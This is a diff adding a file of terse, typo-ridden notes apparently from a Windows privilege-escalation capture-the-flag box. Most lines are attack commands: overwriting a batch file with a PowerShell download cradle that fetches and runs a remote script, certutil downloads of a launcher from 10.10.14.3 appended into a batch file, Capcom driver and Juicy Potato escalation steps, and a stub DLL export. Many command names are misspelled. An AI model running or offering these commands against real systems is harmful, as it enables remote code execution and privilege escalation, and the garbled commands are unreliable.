@@ -1,0 +1,43 @@
+clear the file
+ls clear.bat
+-a--- clear.bat
+[System.IO.File]::open('c:\user\decoder\clear.bat', [System.IO.FileMode]::Truncate)
+
+escape sigle code use double single code
+
+echo 'powershell -nop -c "IEX(New-object Net.webclient).dowloadString(''http://ip/rv-445.ps1'')"' > clear.bat
+
+cerutil -encode cleat.bat c:\users
+sqlsrv\test
+
+copy /y NUL clean.bat
+
+certutil -urlcace -split -f http://10.10.14.3/launcher.ps1  c:\users\sqlsrv\launcher
+
+cmd.exe /c 'type c:\user\sqlsrv\laucher >> clean.bat'
+
+cmd.exe /c driverqury --Capcom
+
+fuzzysecurity capcom
+
+for i in $(find . -name *.ps1); do cat $i; echo ""; done > ../www/capcom.ps1
+
+
+certuilt -encode root.exe root.exe.b64
+
+test for seimpersonateprivilege
+echo "Test" > c:\windows\system32\spool\drivers\color\test.exe
+
+
+juicy-potate
+
+
+
+#include "stdafx.h"
+extern "C"{
+    __declspec(dllexport) int check();
+}
+
+int __cdecl check(){
+    return 1;
+}
